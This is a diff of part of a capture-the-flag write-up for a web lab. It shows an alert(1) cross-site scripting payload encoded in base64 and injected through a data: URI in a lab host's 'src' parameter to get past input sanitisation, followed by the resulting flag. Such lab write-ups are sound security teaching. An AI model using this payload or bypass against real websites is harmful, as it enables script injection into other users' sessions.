@@ -27,6 +27,12 @@ In a DevTools we see that the script was successfully inserted, and we got an al
 
 4. In the OWASP tutorials we found that sometimes the web-apps could be sanitized, so the symbols like "<>" could be parsed, so the solution is to encode the script into base64. To do so, we encode our scrypt into base64:
 
-echo -n '<script>alert(1)</script>' | base64
-
+sh-5.3$ echo -n '<script>alert(1)</script>' | base64
 PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+The result line:
+
+http://10.171.61.48/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+And we get the flag:
+928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d
